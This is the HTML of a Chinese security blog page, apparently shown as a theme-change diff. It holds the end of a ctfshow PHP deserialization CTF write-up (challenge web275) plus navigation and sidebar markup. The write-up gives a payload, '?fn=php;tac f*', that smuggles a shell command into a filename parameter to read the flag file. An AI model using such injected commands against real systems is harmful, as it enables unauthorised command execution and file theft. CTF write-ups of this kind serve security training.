class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure>
 <p>​		想办法触发 <code>__destruct</code>  即可，这里需要 filename 或者 filecontent 包含 php 或者 flag，这样在最后销毁的时候会进入 system 函数，并且 checkevil () 为 true，不会进入 if 语句，程序会进入最后的销毁阶段，触发 <code>__destruct</code> ，因此，即可进入 system 函数，所以 payload 为：</p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fn=php;tac f*</span><br></pre></td></tr></table></figure>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.g01den.top">g01den</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.g01den.top/posts/4fb535d6.html">http://blog.g01den.top/posts/4fb535d6.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.g01den.top" target="_blank">golden的部落阁</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/09/17/789OUwJtAWrNgCo.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/b856856d.html" title="ctfshow-ssrf"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/09/26/buT9gPYUzlEpIce.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ctfshow-ssrf</div></div></a></div><div class="next-post pull-right"><a href="/posts/53e2b2e1.html" title="ctfshow-命令执行"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/09/16/aDvePzf4rhQ9IRT.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctfshow-命令执行</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/2bb7953f.html" title="部分CVE复现Web（1）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture301.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-17</div><div class="title">部分CVE复现Web（1）</div></div></a></div><div><a href="/posts/384200ef.html" title="SQL无列名注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-03</div><div class="title">SQL无列名注入</div></div></a></div><div><a href="/posts/53e2b2e1.html" title="ctfshow-命令执行"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/09/16/aDvePzf4rhQ9IRT.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-16</div><div class="title">ctfshow-命令执行</div></div></a></div><div><a href="/posts/b856856d.html" title="ctfshow-ssrf"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/09/26/buT9gPYUzlEpIce.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">ctfshow-ssrf</div></div></a></div><div><a href="/posts/97a7dff3.html" title="ctfshow-信息搜集"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture315.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-14</div><div class="title">ctfshow-信息搜集</div></div></a></div><div><a href="/posts/2f610211.html" title="反弹shell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture174.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-18</div><div class="title">反弹shell</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://thirdqq.qlogo.cn/headimg_dl?dst_uin=2082045221&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">g01den</div><div class="author-info__description">golden的部落阁</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text"> 一些基础：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web254"><span class="toc-number">2.</span> <span class="toc-text"> web254</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web255"><span class="toc-number">3.</span> <span class="toc-text"> web255：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web256"><span class="toc-number">4.</span> <span class="toc-text"> web256：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web257"><span class="toc-number">5.</span> <span class="toc-text"> web257：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web258"><span class="toc-number">6.</span> <span class="toc-text"> web258：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web259"><span class="toc-number">7.</span> <span class="toc-text"> web259：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web260"><span class="toc-number">8.</span> <span class="toc-text"> web260：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web261"><span class="toc-number">9.</span> <span class="toc-text"> web261：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web262"><span class="toc-number">10.</span> <span class="toc-text"> web262：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web263"><span class="toc-number">11.</span> <span class="toc-text"> web263:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web264"><span class="toc-number">12.</span> <span class="toc-text"> web264：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web265"><span class="toc-number">13.</span> <span class="toc-text"> web265：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web266"><span class="toc-number">14.</span> <span class="toc-text"> web266：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web267"><span class="toc-number">15.</span> <span class="toc-text"> web267：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web268"><span class="toc-number">16.</span> <span class="toc-text"> web268：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web269"><span class="toc-number">17.</span> <span class="toc-text"> web269：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web270"><span class="toc-number">18.</span> <span class="toc-text"> web270：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web271"><span class="toc-number">19.</span> <span class="toc-text"> web271：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web272"><span class="toc-number">20.</span> <span class="toc-text"> web272：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web273"><span class="toc-number">21.</span> <span class="toc-text"> web273：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web274"><span class="toc-number">22.</span> <span class="toc-text"> web274：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web275"><span class="toc-number">23.</span> <span class="toc-text"> web275：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/c2860616.html" title="网鼎杯2024青龙组官方资格赛wp"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/10/31/PowHXa4FhLpSzyu.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网鼎杯2024青龙组官方资格赛wp"/></a><div class="content"><a class="title" href="/posts/c2860616.html" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a><time datetime="2024-10-31T11:24:37.000Z" title="发表于 2024-10-31 19:24:37">2024-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b856856d.html" title="ctfshow-ssrf"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/09/26/buT9gPYUzlEpIce.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-ssrf"/></a><div class="content"><a class="title" href="/posts/b856856d.html" title="ctfshow-ssrf">ctfshow-ssrf</a><time datetime="2024-09-26T11:09:50.000Z" title="发表于 2024-09-26 19:09:50">2024-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4fb535d6.html" title="ctfshow-反序列化"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/09/17/789OUwJtAWrNgCo.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-反序列化"/></a><div class="content"><a class="title" href="/posts/4fb535d6.html" title="ctfshow-反序列化">ctfshow-反序列化</a><time datetime="2024-09-17T12:19:47.000Z" title="发表于 2024-09-17 20:19:47">2024-09-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/53e2b2e1.html" title="ctfshow-命令执行"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/09/16/aDvePzf4rhQ9IRT.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-命令执行"/></a><div class="content"><a class="title" href="/posts/53e2b2e1.html" title="ctfshow-命令执行">ctfshow-命令执行</a><time datetime="2024-09-16T13:04:45.000Z" title="发表于 2024-09-16 21:04:45">2024-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/97a7dff3.html" title="ctfshow-信息搜集"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture315.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-信息搜集"/></a><div class="content"><a class="title" href="/posts/97a7dff3.html" title="ctfshow-信息搜集">ctfshow-信息搜集</a><time datetime="2024-09-14T08:55:17.000Z" title="发表于 2024-09-14 16:55:17">2024-09-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By g01den</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="12208257400" data-server="netease" data-type="playlist"   data-order="list" data-fixed="true" data-preload="auto" data-autoplay="false" data-mutex="true" ></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
-for(var i = 0;i<arr.length;i++){
-    arr[i].classList.add('wow');
-    arr[i].classList.add('animate__zoomIn');
-    arr[i].setAttribute('data-wow-duration', '1.5s');
-    arr[i].setAttribute('data-wow-delay', '200ms');
-    arr[i].setAttribute('data-wow-offset', '30');
-    arr[i].setAttribute('data-wow-iteration', '1');
-  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
-for(var i = 0;i<arr.length;i++){
-    arr[i].classList.add('wow');
-    arr[i].classList.add('animate__zoomIn');
-    arr[i].setAttribute('data-wow-duration', '');
-    arr[i].setAttribute('data-wow-delay', '200ms');
-    arr[i].setAttribute('data-wow-offset', '');
-    arr[i].setAttribute('data-wow-iteration', '');
-  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
-for(var i = 0;i<arr.length;i++){
-    arr[i].classList.add('wow');
-    arr[i].classList.add('animate__flipInY');
-    arr[i].setAttribute('data-wow-duration', '3s');
-    arr[i].setAttribute('data-wow-delay', '');
-    arr[i].setAttribute('data-wow-offset', '');
-    arr[i].setAttribute('data-wow-iteration', '');
-  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
-for(var i = 0;i<arr.length;i++){
-    arr[i].classList.add('wow');
-    arr[i].classList.add('animate__animated');
-    arr[i].setAttribute('data-wow-duration', '3s');
-    arr[i].setAttribute('data-wow-delay', '');
-    arr[i].setAttribute('data-wow-offset', '');
-    arr[i].setAttribute('data-wow-iteration', '');
-  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
-for(var i = 0;i<arr.length;i++){
-    arr[i].classList.add('wow');
-    arr[i].classList.add('animate__slideInRight');
-    arr[i].setAttribute('data-wow-duration', '1.5s');
-    arr[i].setAttribute('data-wow-delay', '');
-    arr[i].setAttribute('data-wow-offset', '');
-    arr[i].setAttribute('data-wow-iteration', '');
-  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
-for(var i = 0;i<arr.length;i++){
-    arr[i].classList.add('wow');
-    arr[i].classList.add('animate__flipInY');
-    arr[i].setAttribute('data-wow-duration', '3s');
-    arr[i].setAttribute('data-wow-delay', '');
-    arr[i].setAttribute('data-wow-offset', '');
-    arr[i].setAttribute('data-wow-iteration', '');
-  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
-for(var i = 0;i<arr.length;i++){
-    arr[i].classList.add('wow');
-    arr[i].classList.add('animate__animated');
-    arr[i].setAttribute('data-wow-duration', '3s');
-    arr[i].setAttribute('data-wow-delay', '');
-    arr[i].setAttribute('data-wow-offset', '');
-    arr[i].setAttribute('data-wow-iteration', '');
-  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
+
+      <div class="tags">
+          <a href="/tags/Web/" rel="tag"><i class="ic i-tag"></i> Web</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-09-26 15:18:42" itemprop="dateModified" datetime="2024-09-26T15:18:42+08:00">2024-09-26</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/4fb535d6.html" title="ctfshow-反序列化">http://blog.g01den.top/posts/4fb535d6.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/53e2b2e1.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;09&#x2F;16&#x2F;aDvePzf4rhQ9IRT.png" title="ctfshow-命令执行">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
+  <h3>ctfshow-命令执行</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/b856856d.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2024&#x2F;09&#x2F;26&#x2F;buT9gPYUzlEpIce.jpg" title="ctfshow-ssrf">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
+  <h3>ctfshow-ssrf</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text"> 一些基础：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web254"><span class="toc-number">2.</span> <span class="toc-text"> web254</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web255"><span class="toc-number">3.</span> <span class="toc-text"> web255：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web256"><span class="toc-number">4.</span> <span class="toc-text"> web256：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web257"><span class="toc-number">5.</span> <span class="toc-text"> web257：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web258"><span class="toc-number">6.</span> <span class="toc-text"> web258：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web259"><span class="toc-number">7.</span> <span class="toc-text"> web259：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web260"><span class="toc-number">8.</span> <span class="toc-text"> web260：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web261"><span class="toc-number">9.</span> <span class="toc-text"> web261：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web262"><span class="toc-number">10.</span> <span class="toc-text"> web262：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web263"><span class="toc-number">11.</span> <span class="toc-text"> web263:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web264"><span class="toc-number">12.</span> <span class="toc-text"> web264：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web265"><span class="toc-number">13.</span> <span class="toc-text"> web265：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web266"><span class="toc-number">14.</span> <span class="toc-text"> web266：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web267"><span class="toc-number">15.</span> <span class="toc-text"> web267：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web268"><span class="toc-number">16.</span> <span class="toc-text"> web268：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web269"><span class="toc-number">17.</span> <span class="toc-text"> web269：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web270"><span class="toc-number">18.</span> <span class="toc-text"> web270：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web271"><span class="toc-number">19.</span> <span class="toc-text"> web271：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web272"><span class="toc-number">20.</span> <span class="toc-text"> web272：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web273"><span class="toc-number">21.</span> <span class="toc-text"> web273：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web274"><span class="toc-number">22.</span> <span class="toc-text"> web274：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web275"><span class="toc-number">23.</span> <span class="toc-text"> web275：</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/posts/384200ef.html" rel="bookmark" title="SQL无列名注入">SQL无列名注入</a></li><li><a href="/posts/88915f6f.html" rel="bookmark" title="无参数RCE的一些奇技淫巧">无参数RCE的一些奇技淫巧</a></li><li><a href="/posts/2f610211.html" rel="bookmark" title="反弹shell">反弹shell</a></li><li><a href="/posts/ff5b88d5.html" rel="bookmark" title="python原型链污染">python原型链污染</a></li><li><a href="/posts/97a7dff3.html" rel="bookmark" title="ctfshow-信息搜集">ctfshow-信息搜集</a></li><li><a href="/posts/53e2b2e1.html" rel="bookmark" title="ctfshow-命令执行">ctfshow-命令执行</a></li><li class="active"><a href="/posts/4fb535d6.html" rel="bookmark" title="ctfshow-反序列化">ctfshow-反序列化</a></li><li><a href="/posts/b856856d.html" rel="bookmark" title="ctfshow-ssrf">ctfshow-ssrf</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">39</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/53e2b2e1.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/b856856d.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/e20e7502.html" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/b856856d.html" title="ctfshow-ssrf">ctfshow-ssrf</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
+</div>
+
+    <span><a href="/posts/3fe30769.html" title="一、Servlet和JSP技术概述">一、Servlet和JSP技术概述</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Misc/" title="分类于 杂七杂八的知识点">杂七杂八的知识点</a>
+</div>
+
